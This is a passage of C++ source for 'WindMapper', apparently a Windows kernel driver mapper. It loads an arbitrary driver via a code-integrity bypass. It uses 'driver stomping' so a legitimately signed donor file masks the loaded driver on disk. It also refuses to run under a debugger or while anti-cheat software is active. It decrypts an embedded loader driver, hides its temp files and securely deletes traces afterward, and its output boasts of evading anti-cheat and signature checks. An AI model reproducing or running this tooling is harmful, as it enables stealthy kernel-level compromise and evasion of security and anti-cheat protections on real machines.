                                CERT_POLICIES_INFO* polInfo = nullptr;
                                DWORD cbDecoded = 0;
                                if (CryptDecodeObjectEx(
                                    X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                                    X509_CERT_POLICIES,
                                    pExt->Value.pbData,
                                    pExt->Value.cbData,
                                    CRYPT_DECODE_ALLOC_FLAG,
                                    nullptr,
                                    &polInfo,
                                    &cbDecoded) && polInfo) {
                                    for (DWORD p = 0; p < polInfo->cPolicyInfo && !isEV; p++) {
                                        for (int oid = 0; oid < sizeof(evOIDs) / sizeof(evOIDs[0]); oid++) {
                                            if (strcmp(polInfo->rgPolicyInfo[p].pszPolicyIdentifier, evOIDs[oid]) == 0) {
                                                isEV = TRUE;
                                                break;
                                            }
                                        }
                                    }
                                    LocalFree(polInfo);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if (hasCert) {
        printf("[+] Signer: %s\n", signerNameA[0] ? signerNameA : "Unknown");
        printf("[+] Certificate type: %s\n", isEV ? "EV Code Signing" : "Standard Code Signing");
        if (isStomped) {
            printf("[+] Certificate source: LEGITIMATE donor driver (original Authenticode intact)\n");
        } else {
            printf("[+] Certificate present: YES\n");
        }
        if (hasTimestamp)
            printf("[+] Timestamp: Present (counter-signed)\n");
        if (lStatus == ERROR_SUCCESS) {
            printf("[+] WinVerifyTrust: VALID (\"This digital signature is OK.\")\n");
            printf("[+] Authenticode hash: MATCH (signature chain fully verified)\n");
        } else {
            printf("[-] WinVerifyTrust: FAILED (0x%08lX)\n", lStatus);
        }
        // Store signer name globally for reference
        if (signerNameA[0]) {
            MultiByteToWideChar(CP_ACP, 0, signerNameA, -1, g_DonorSignerName, 256);
        }
    } else {
        printf("[-] No certificate data found in file\n");
    }

    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionGUID, &trustData);

    printf("\n[*] Verification summary:\n");
    if (g_KernelSigningVerified) {
        printf("[+] KERNEL-MODE (what anti-cheats check): SIGNED\n");
        printf("[+] MmVerifyCallbackFunction returns TRUE for all callback registrations\n");
        printf("[+] Driver has real DRIVER_OBJECT, LDR entry, PiDDB entry, KernelHashBucket\n");
        printf("[+] PsLoadedModuleList entry is PatchGuard-protected\n");
    }
    if (hasCert && isStomped) {
        printf("[+] DISK-LEVEL (driver stomping): %s certificate (%s)\n",
            isEV ? "EV" : "Standard", signerNameA[0] ? signerNameA : "Unknown");
        if (lStatus == ERROR_SUCCESS) {
            printf("[+] Service ImagePath points to legitimately signed donor file\n");
            printf("[+] Right-click -> Properties -> Digital Signatures: FULLY VALID\n");
            printf("[+] \"This digital signature is OK.\" with complete certificate chain\n");
        }
    } else if (hasCert) {
        printf("[+] DISK-LEVEL (cosmetic): %s certificate embedded (%s)\n",
            isEV ? "EV" : "Standard", signerNameA[0] ? signerNameA : "Unknown");
    }
    printf("\n");
}

int main(int argc, char* argv[]) {
#ifndef _DEBUG
    if (AntiDetect::IsBeingDebugged()) {
        return 1;
    }
#endif

    if (CheckAntiCheatRunning()) {
        printf("[-] Anti-cheat detected! Aborting driver mapping.\n");
        printf("[-] Please close all anti-cheat software and games before running this tool.\n");
        return 1;
    }

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                printf("[-] Failed to enable SE_LOAD_DRIVER privilege. Run as administrator.\n");
                CloseHandle(hToken);
                return 1;
            }
        }
        CloseHandle(hToken);
    }

    if (argc < 2) {
        printf("[-] Usage: WindMapper.exe <driver.sys>\n");
        return 1;
    }

    printf("[*] Initializing NT functions...\n");
    if (!Utils::InitializeNtFunctions()) {
        printf("[-] Failed to resolve NT functions\n");
        return 1;
    }

    printf("[*] Decrypting embedded driver...\n");
    if (!InitializeDriverData()) {
        printf("[-] Failed to initialize embedded driver data\n");
        return 1;
    }

    std::wstring driverArg;
    {
        size_t argLen = strlen(argv[1]);
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, nullptr, 0);
        if (wideLen <= 0) {
            ReleaseDriverData();
            return 1;
        }
        driverArg.resize(static_cast<size_t>(wideLen));
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, &driverArg[0], wideLen);
        driverArg.resize(wcslen(driverArg.c_str()));
    }

    if (g_P2CDriverSize == 0) {
        printf("[-] Embedded driver size is 0\n");
        ReleaseDriverData();
        return 1;
    }
    printf("[+] Embedded driver ready (%zu bytes)\n", g_P2CDriverSize);

    std::wstring loaderFilePath = Utils::GetTempFilePath(L".sys");
    std::wstring driverFilePath = Utils::GetTempFilePath(L".sys");

    if (loaderFilePath.empty() || driverFilePath.empty()) {
        printf("[-] Failed to generate temp file paths\n");
        ReleaseDriverData();
        return 1;
    }

    HANDLE loaderFile = CreateFileW(
        loaderFilePath.c_str(),
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_SEQUENTIAL_SCAN,
        nullptr
    );

    if (loaderFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create loader temp file (err=%lu)\n", GetLastError());
        ReleaseDriverData();
        return 1;
    }

    DWORD written = 0;
    DWORD expectedSize = static_cast<DWORD>(g_P2CDriverSize);
    BOOL writeOk = WriteFile(loaderFile, g_P2CDriverData, expectedSize, &written, nullptr);
    DWORD writeErr = GetLastError();
    FlushFileBuffers(loaderFile);
    CloseHandle(loaderFile);

    ReleaseDriverData();

    if (!writeOk || written != expectedSize) {
        printf("[-] WriteFile failed: wrote %lu/%lu bytes, WriteFile=%d, err=%lu\n", written, expectedSize, writeOk, writeErr);
        Utils::SecureDeleteFile(loaderFilePath.c_str());
        return 1;
    }
    printf("[+] Loader driver written (%lu bytes)\n", written);

    if (!CopyFileW(driverArg.c_str(), driverFilePath.c_str(), FALSE)) {
        printf("[-] Failed to copy target driver (err=%lu). Does the file exist?\n", GetLastError());
        Utils::SecureDeleteFile(loaderFilePath.c_str());
        return 1;
    }
    printf("[+] Files prepared\n");

    SetFileAttributesW(driverFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);

    printf("[*] Starting driver mapping...\n");
    NTSTATUS status = MapperCore::WindLoadDriver(loaderFilePath.c_str(), driverFilePath.c_str());

    if (NT_SUCCESS(status)) {
        RunSignatureCheck(driverFilePath.c_str());
    }

    printf("[*] Cleaning up...\n");
    // Delete temp files: loader always, target always (it was loaded via CI bypass)
    // The donor copy must be PRESERVED — it provides the valid on-disk signature
    for (int i = 0; i < 10; i++) {
        BOOL loaderDel = Utils::SecureDeleteFile(loaderFilePath.c_str());
        BOOL driverDel = Utils::SecureDeleteFile(driverFilePath.c_str());
        if (loaderDel && driverDel) break;
        Sleep(30);
    }

    MapperCore::CleanupArtifacts();

    if (NT_SUCCESS(status)) {
        printf("[+] Driver mapped successfully\n");
        if (g_DonorCopyPath[0]) {
            printf("[+] Donor file preserved at: %ws\n", g_DonorCopyPath);
            printf("[+] Service registry points to signed donor (driver stomping active)\n");
        }
    } else {
        printf("[-] Driver mapping failed: 0x%08X\n", status);
    }

    return NT_SUCCESS(status) ? 0 : 1;
}